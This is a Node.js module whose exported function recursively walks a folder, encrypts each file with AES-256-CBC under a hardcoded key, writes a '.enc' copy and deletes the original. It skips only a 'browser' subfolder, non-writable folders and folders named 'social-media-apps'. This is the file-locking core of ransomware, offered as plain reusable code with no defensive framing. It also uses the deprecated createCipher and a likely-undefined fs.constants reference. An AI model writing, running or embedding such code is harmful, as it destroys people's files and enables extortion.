const crypto = require('crypto');
const fs = require('fs').promises;
const path = require('path');
const os = require("os");

const algorithm = 'aes-256-cbc';
const key = "myPrivateKey";

async function encryptFile(filePath) {
  try {
    const fileData = await fs.readFile(filePath);
    const cipher = crypto.createCipher(algorithm, key);
    let encryptedData = cipher.update(fileData);
    encryptedData = Buffer.concat([encryptedData, cipher.final()]);
    const encryptedFilePath = `${filePath}.enc`;
    await fs.writeFile(encryptedFilePath, encryptedData);
    await fs.unlink(filePath);
    console.log(`Original file ${filePath} deleted.`);
  } catch (err) {
    console.error(`Error while encrypting file ${filePath}: ${err}`);
  }
}

async function traverseDirectory(directory, callback) {
  try {
    const folderStats = await fs.stat(directory);
    if (!folderStats.isDirectory()) {
      return;
    }

    const folderItems = await fs.readdir(directory);
    for (const item of folderItems) {
      const itemPath = path.join(directory, item);
      const itemStats = await fs.stat(itemPath);

      if (itemStats.isDirectory() && item !== 'browser') {
        await traverseDirectory(itemPath, callback);
      } else if (itemStats.isFile()) {
        await callback(itemPath);
      }
    }
  } catch (err) {
    console.error(`Error while traversing directory ${directory}: ${err}`);
  }
}

async function encryptFolder(folderPath) {
  try {
    // Check if the folder requires permission and skip it if required
    const folderPermissions = await fs.stat(folderPath);
    if (!(folderPermissions.mode & fs.constants.S_IWUSR)) {
      console.log(`Skipping folder ${folderPath} as it requires permission`);
      return;
    }

    // Check if folder contains installations related to social media apps
    const folderName = path.basename(folderPath);
    if (/social-media-apps/.test(folderName)) {
      console.log(`Skipping folder ${folderPath} as it contains installations related to social media apps`);
      return;
    }

    await traverseDirectory(folderPath, encryptFile);
    console.log(`Folder ${folderPath} encrypted.`);
  } catch (err) {
    console.error(`Error while encrypting folder ${folderPath}: ${err}`);
  }
}
module.exports = { encryptFolder };